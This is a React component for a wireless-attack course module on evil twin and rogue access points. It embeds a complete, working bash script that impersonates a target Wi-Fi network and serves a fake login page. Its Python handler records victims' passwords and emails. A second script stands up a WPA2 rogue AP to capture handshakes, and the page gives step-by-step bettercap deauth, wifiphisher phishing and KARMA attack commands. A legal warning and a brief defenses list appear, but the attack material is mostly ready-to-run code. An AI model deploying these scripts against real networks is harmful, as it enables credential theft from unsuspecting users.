import { Network, AlertTriangle, Check, Info, Shield, Wifi, Lock } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const EvilTwin = () => {
  const evilTwinScript = `#!/bin/bash
# Evil Twin Attack Script
# Creates a rogue AP to capture credentials
# Usage: sudo bash evil_twin.sh <target_ssid> <channel> <interface>

set -e

TARGET_SSID=\${1:?"Usage: \$0 <TARGET_SSID> <CHANNEL> <INTERFACE>"}
CHANNEL=\${2:?"Please specify channel"}
INTERFACE=\${3:-wlan1}

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
NC='\\033[0m'

print_status() { echo -e "\${CYAN}[*]\${NC} \$1"; }
print_success() { echo -e "\${GREEN}[+]\${NC} \$1"; }
print_warning() { echo -e "\${YELLOW}[!]\${NC} \$1"; }
print_error() { echo -e "\${RED}[-]\${NC} \$1"; }

WORK_DIR="./evil_twin_\$(date +%Y%m%d_%H%M%S)"
mkdir -p "\$WORK_DIR"

echo "=========================================="
echo "         Evil Twin Attack Setup"
echo "=========================================="
echo ""

print_warning "This creates a rogue AP impersonating: \$TARGET_SSID"
print_warning "Only use with authorization!"
echo ""

# Check dependencies
for tool in hostapd dnsmasq iptables; do
    if ! command -v \$tool &>/dev/null; then
        print_status "Installing \$tool..."
        sudo apt install -y \$tool
    fi
done

# Stop NetworkManager for this interface
print_status "Preparing interface \$INTERFACE..."
sudo nmcli device set \$INTERFACE managed no 2>/dev/null || true
sudo ip link set \$INTERFACE down
sudo ip addr flush dev \$INTERFACE
sudo ip link set \$INTERFACE up
sudo ip addr add 192.168.1.1/24 dev \$INTERFACE

# Create hostapd config
print_status "Creating hostapd configuration..."
cat > "\$WORK_DIR/hostapd.conf" << EOF
interface=\$INTERFACE
driver=nl80211
ssid=\$TARGET_SSID
hw_mode=g
channel=\$CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# Create dnsmasq config
print_status "Creating dnsmasq configuration..."
cat > "\$WORK_DIR/dnsmasq.conf" << EOF
interface=\$INTERFACE
dhcp-range=192.168.1.10,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-facility=\$WORK_DIR/dnsmasq.log
address=/#/192.168.1.1
EOF

# Create simple captive portal
print_status "Creating captive portal..."
mkdir -p "\$WORK_DIR/www"
cat > "\$WORK_DIR/www/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; margin-bottom: 20px; font-size: 24px; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 48px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h1>WiFi Authentication Required</h1>
        <p>Please enter your WiFi password to continue.</p>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Email (optional)">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
        <p class="footer">Secure Connection</p>
    </div>
</body>
</html>
HTMLEOF

# Create capture script
cat > "\$WORK_DIR/www/capture.py" << 'PYEOF'
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse
import datetime
import os

CAPTURE_FILE = os.environ.get('CAPTURE_FILE', 'captured_creds.txt')

class CaptureHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)
        
        timestamp = datetime.datetime.now().isoformat()
        client_ip = self.client_address[0]
        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]
        
        log_entry = f"[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password}\\n"
        
        with open(CAPTURE_FILE, 'a') as f:
            f.write(log_entry)
        
        print(f"\\033[92m[+] CAPTURED:\\033[0m {log_entry.strip()}")
        
        self.send_response(302)
        self.send_header('Location', 'http://google.com')
        self.end_headers()

    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return SimpleHTTPRequestHandler.do_GET(self)

if __name__ == '__main__':
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    server = HTTPServer(('0.0.0.0', 80), CaptureHandler)
    print('[*] Captive portal running on port 80...')
    server.serve_forever()
PYEOF
chmod +x "\$WORK_DIR/www/capture.py"

# Enable IP forwarding
print_status "Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup iptables for captive portal
print_status "Configuring iptables..."
iptables -t nat -F
iptables -F
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

print_success "Evil Twin setup complete!"
echo ""
print_status "Starting services..."
echo "=========================================="

# Start services in background
dnsmasq -C "\$WORK_DIR/dnsmasq.conf" &
DNSMASQ_PID=\$!
print_success "dnsmasq started (PID: \$DNSMASQ_PID)"

hostapd "\$WORK_DIR/hostapd.conf" &
HOSTAPD_PID=\$!
print_success "hostapd started (PID: \$HOSTAPD_PID)"

sleep 2

cd "\$WORK_DIR/www"
CAPTURE_FILE="../captured_creds.txt" python3 capture.py &
WEB_PID=\$!
print_success "Captive portal started (PID: \$WEB_PID)"

echo ""
print_success "Evil Twin AP '\$TARGET_SSID' is now broadcasting!"
print_status "Captured credentials will be saved to: \$WORK_DIR/captured_creds.txt"
print_warning "Press Ctrl+C to stop"
echo ""

# Cleanup function
cleanup() {
    echo ""
    print_status "Shutting down..."
    kill \$DNSMASQ_PID \$HOSTAPD_PID \$WEB_PID 2>/dev/null || true
    iptables -t nat -F
    iptables -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
    sudo nmcli device set \$INTERFACE managed yes 2>/dev/null || true
    print_success "Cleanup complete"
    
    if [ -f "\$WORK_DIR/captured_creds.txt" ]; then
        echo ""
        print_success "Captured credentials:"
        cat "\$WORK_DIR/captured_creds.txt"
    fi
}

trap cleanup EXIT

# Wait
wait`;

  const hostapd_wpaScript = `#!/bin/bash
# WPA2 Evil Twin Script
# Creates a WPA2 rogue AP (for credential relay attacks)
# Usage: sudo bash wpa_evil_twin.sh <ssid> <channel> <interface>

SSID=\${1:-"FreeWiFi"}
CHANNEL=\${2:-6}
INTERFACE=\${3:-wlan1}
PASSWORD="password123"  # Fake password - captures connection attempts

WORK_DIR="./wpa_twin_\$(date +%Y%m%d_%H%M%S)"
mkdir -p "\$WORK_DIR"

echo "[*] Creating WPA2 Evil Twin: \$SSID"

# hostapd config with WPA2
cat > "\$WORK_DIR/hostapd_wpa.conf" << EOF
interface=\$INTERFACE
driver=nl80211
ssid=\$SSID
hw_mode=g
channel=\$CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=\$PASSWORD
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP

# Enable EAPOL logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
EOF

# Prepare interface
sudo ip link set \$INTERFACE down
sudo ip addr flush dev \$INTERFACE
sudo ip link set \$INTERFACE up

echo "[*] Starting WPA2 AP with hostapd..."
echo "[*] Clients attempting to connect will fail but we capture their handshakes!"
echo "[*] Run airodump-ng on another interface to capture handshakes"
echo ""

sudo hostapd "\$WORK_DIR/hostapd_wpa.conf"`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Network className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 06</span>
              <h2 className="text-2xl font-bold text-foreground">Evil Twin & Rogue Access Point</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Evil Twin attacks create a fake access point that impersonates a legitimate network. When victims 
            connect, their traffic can be intercepted, credentials captured, or man-in-the-middle attacks performed. 
            This is one of the most effective wireless attacks.
          </p>

          {/* Legal Warning */}
          <div className="p-4 rounded-lg border border-destructive/50 bg-destructive/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-destructive mb-1">Legal Warning</h4>
                <p className="text-sm text-muted-foreground">
                  Creating rogue access points to intercept traffic is illegal without authorization. These 
                  attacks involve wire fraud and computer fraud laws. Only perform in authorized penetration 
                  tests or controlled lab environments.
                </p>
              </div>
            </div>
          </div>

          {/* Theory Section */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              How Evil Twin Attacks Work
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">The Setup:</strong> You create an access point with the same SSID 
                as the target network. Optionally, you deauth clients from the real AP to force them to reconnect - 
                hopefully to your fake one.
              </p>
              <p>
                <strong className="text-foreground">Why It Works:</strong> WiFi clients typically auto-connect to 
                known networks. They often choose the AP with the strongest signal. Your rogue AP can have a stronger 
                signal if you're physically closer to the victim.
              </p>
              <p>
                <strong className="text-foreground">Captive Portal:</strong> Once connected, you serve a fake login 
                page claiming they need to re-authenticate to use the WiFi. Users often enter their real passwords, 
                which you capture.
              </p>
            </div>
          </div>

          {/* Attack Types */}
          <div className="grid md:grid-cols-3 gap-4 mb-8">
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Wifi className="w-8 h-8 text-primary flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">Open Evil Twin</h3>
                  <p className="text-sm text-muted-foreground">
                    No password required. Easiest to get victims to connect. Serves captive portal.
                  </p>
                </div>
              </div>
            </div>
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Lock className="w-8 h-8 text-accent flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">WPA2 Evil Twin</h3>
                  <p className="text-sm text-muted-foreground">
                    Fake WPA2 network. Captures handshakes when clients try to connect with wrong password.
                  </p>
                </div>
              </div>
            </div>
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Shield className="w-8 h-8 text-destructive flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">KARMA Attack</h3>
                  <p className="text-sm text-muted-foreground">
                    Responds to ALL probe requests. Impersonates any network clients are looking for.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Prerequisites */}
          <div className="p-4 rounded-lg border border-warning/50 bg-warning/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-warning flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-warning mb-1">Prerequisites & Requirements</h4>
                <ul className="text-sm text-muted-foreground space-y-1">
                  <li>• Two wireless interfaces: one for the rogue AP, one for deauth/monitor (optional)</li>
                  <li>• hostapd installed: <code className="text-primary">sudo apt install hostapd</code></li>
                  <li>• dnsmasq installed: <code className="text-primary">sudo apt install dnsmasq</code></li>
                  <li>• Root access for network configuration</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Method 1: Manual Evil Twin Setup */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 1: Manual Evil Twin Setup</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Step-by-step manual configuration of an open evil twin with captive portal.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install hostapd dnsmasq"
              description="Step 1: Install required packages"
              explanation="hostapd creates the access point, dnsmasq provides DHCP and DNS services to connected clients."
            />

            <CommandBlock
              command="sudo systemctl stop hostapd dnsmasq NetworkManager 2>/dev/null"
              description="Step 2: Stop conflicting services"
              explanation="These services can interfere with our manual configuration. We'll manage the interface directly."
            />

            <CommandBlock
              command="sudo ip link set wlan1 down && sudo ip addr flush dev wlan1 && sudo ip link set wlan1 up && sudo ip addr add 192.168.1.1/24 dev wlan1"
              description="Step 3: Configure interface with static IP"
              explanation="Sets up wlan1 with IP 192.168.1.1. This will be the gateway for connected clients."
            />

            <CommandBlock
              command={`cat > /tmp/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF`}
              description="Step 4: Create hostapd configuration"
              explanation="Configures an open (no password) access point on channel 6. Change 'ssid' to match your target network name."
            />

            <CommandBlock
              command={`cat > /tmp/dnsmasq.conf << EOF
interface=wlan1
dhcp-range=192.168.1.10,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
address=/#/192.168.1.1
EOF`}
              description="Step 5: Create dnsmasq configuration"
              explanation="DHCP range for clients, sets gateway and DNS to our AP IP. 'address=/#/...' redirects ALL DNS queries to us (captive portal)."
            />

            <CommandBlock
              command="sudo dnsmasq -C /tmp/dnsmasq.conf"
              description="Step 6: Start DHCP/DNS server"
              explanation="Starts dnsmasq with our config. It will assign IPs to clients and redirect their DNS."
            />

            <CommandBlock
              command="sudo hostapd /tmp/hostapd.conf"
              description="Step 7: Start the rogue access point"
              explanation="Starts broadcasting the fake network. Clients will now see 'TargetNetwork' and can connect."
            />
          </div>

          {/* Captive Portal Setup */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Setting Up the Captive Portal</h3>
          <p className="text-sm text-muted-foreground mb-4">
            The captive portal presents a fake login page to capture credentials.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="echo 1 > /proc/sys/net/ipv4/ip_forward"
              description="Enable IP forwarding"
              explanation="Allows the Pi to route traffic between the fake AP and the real internet (if connected)."
            />

            <CommandBlock
              command="sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80"
              description="Redirect HTTP traffic to captive portal"
              explanation="All HTTP requests (port 80) are redirected to our web server. This is how the captive portal intercepts browsing."
            />

            <CommandBlock
              command="sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443"
              description="Redirect HTTPS traffic (optional)"
              explanation="HTTPS redirection requires SSL certificates (self-signed will show warnings). Often skipped."
            />

            <CommandBlock
              command="sudo python3 -m http.server 80"
              description="Simple web server for captive portal"
              explanation="Serves the captive portal HTML. Replace with a custom script to capture POSTed credentials."
            />
          </div>

          {/* Method 2: Bettercap */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 2: Automated with Bettercap</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Bettercap is a powerful network attack tool that automates evil twin attacks.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install bettercap"
              description="Install bettercap"
              explanation="Bettercap is an all-in-one network attack framework with built-in evil twin capabilities."
            />

            <CommandBlock
              command="sudo bettercap -iface wlan1"
              description="Start bettercap"
              explanation="Launches bettercap interactive console on wlan1."
            />

            <CommandBlock
              command="wifi.recon on"
              description="Enable WiFi reconnaissance (in bettercap)"
              explanation="Starts scanning for nearby access points and clients."
            />

            <CommandBlock
              command="wifi.show"
              description="Display discovered networks (in bettercap)"
              explanation="Lists all discovered APs with their details."
            />

            <CommandBlock
              command='set wifi.ap.ssid "TargetNetwork"'
              description="Set evil twin SSID"
              explanation="Configure the SSID for your rogue AP to match the target."
            />

            <CommandBlock
              command="set wifi.ap.channel 6"
              description="Set channel"
              explanation="Match the target network's channel for best results."
            />

            <CommandBlock
              command="wifi.ap on"
              description="Start the evil twin AP"
              explanation="Broadcasts the rogue access point."
            />

            <CommandBlock
              command='wifi.deauth AA:BB:CC:DD:EE:FF'
              description="Deauth clients from real AP"
              explanation="Forces clients off the legitimate network so they connect to your evil twin."
            />
          </div>

          {/* Method 3: Wifiphisher */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 3: Wifiphisher (All-in-One)</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Wifiphisher automates the entire evil twin attack including captive portal.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install wifiphisher"
              description="Install wifiphisher"
              explanation="Dedicated tool for automated phishing attacks via WiFi."
            />

            <CommandBlock
              command="sudo wifiphisher"
              description="Run wifiphisher (interactive)"
              explanation="Launches interactive mode. Select target network, choose phishing scenario, and attack automatically."
            />

            <CommandBlock
              command="sudo wifiphisher -aI wlan1 -jI wlan0 -p oauth-login -e 'TargetNetwork'"
              description="Automated attack with specific settings"
              explanation="-aI is the AP interface, -jI is the jamming (deauth) interface, -p is the phishing scenario, -e is the ESSID."
            />
          </div>

          {/* Built-in Phishing Templates */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Wifiphisher Phishing Scenarios</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary font-mono">Scenario</th>
                    <th className="text-left py-2 text-foreground">Description</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">firmware-upgrade</td>
                    <td className="py-2">Claims router needs update, asks for WPA password</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">oauth-login</td>
                    <td className="py-2">Generic OAuth login page (Google, Facebook style)</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">wifi_connect</td>
                    <td className="py-2">Simple "enter password to connect" page</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">plugin_update</td>
                    <td className="py-2">Browser plugin update required page</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* KARMA Attack */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Advanced: KARMA Attack</h3>
          <p className="text-sm text-muted-foreground mb-4">
            KARMA responds to ALL probe requests, impersonating any network a client is looking for.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install hostapd-mana"
              description="Install hostapd-mana"
              explanation="Modified hostapd with KARMA attack capabilities."
            />

            <CommandBlock
              command={`cat > /tmp/mana.conf << EOF
interface=wlan1
driver=nl80211
hw_mode=g
channel=6
ssid=FreeWiFi
mana_wpaout=/tmp/mana-wpa.hccapx
enable_mana=1
mana_loud=1
EOF`}
              description="Create MANA configuration"
              explanation="enable_mana=1 activates KARMA. mana_loud=1 responds to all probes. Captures WPA handshakes to mana_wpaout."
            />

            <CommandBlock
              command="sudo hostapd-mana /tmp/mana.conf"
              description="Start KARMA attack"
              explanation="Now any device probing for any network will be told 'Yes, I am that network!' Very effective against phones."
            />
          </div>

          {/* Defenses Section */}
          <div className="p-5 rounded-xl border border-primary/50 bg-primary/10 mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Shield className="w-5 h-5 text-primary" />
              How Organizations Can Defend
            </h3>
            <ul className="space-y-2 text-sm text-muted-foreground">
              <li>• <strong className="text-foreground">802.1X Enterprise Authentication:</strong> Requires valid certificates, not just a password</li>
              <li>• <strong className="text-foreground">Wireless IDS/IPS:</strong> Detects rogue APs and deauth attacks</li>
              <li>• <strong className="text-foreground">Client Certificate Validation:</strong> Clients verify AP's certificate before connecting</li>
              <li>• <strong className="text-foreground">Disable Auto-Connect:</strong> Require manual confirmation for network connections</li>
              <li>• <strong className="text-foreground">VPN Always-On:</strong> Encrypts all traffic even on hostile networks</li>
            </ul>
          </div>

          {/* Scripts */}
          <h3 className="text-lg font-semibold text-foreground mb-4">Automation Scripts</h3>
          <ScriptBlock
            title="Complete Evil Twin Attack"
            filename="evil_twin.sh"
            language="bash"
            description="Full evil twin with captive portal. Usage: sudo bash evil_twin.sh TargetNetwork 6 wlan1"
            code={evilTwinScript}
          />

          <div className="mt-6">
            <ScriptBlock
              title="WPA2 Evil Twin"
              filename="wpa_evil_twin.sh"
              language="bash"
              description="WPA2 rogue AP for handshake capture. Usage: sudo bash wpa_evil_twin.sh SSID 6 wlan1"
              code={hostapd_wpaScript}
            />
          </div>

          {/* Completion Checklist */}
          <div className="mt-8 p-5 rounded-xl border border-success/50 bg-success/10">
            <h4 className="font-semibold text-success mb-3 flex items-center gap-2">
              <Check className="w-5 h-5" />
              Module Completion Checklist
            </h4>
            <ul className="space-y-2 text-sm">
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Created an open evil twin access point</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Configured DHCP and DNS with dnsmasq</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Set up a captive portal page</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Captured credentials through the portal</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Tested wifiphisher or bettercap automation</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Understand KARMA attack concepts</span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};
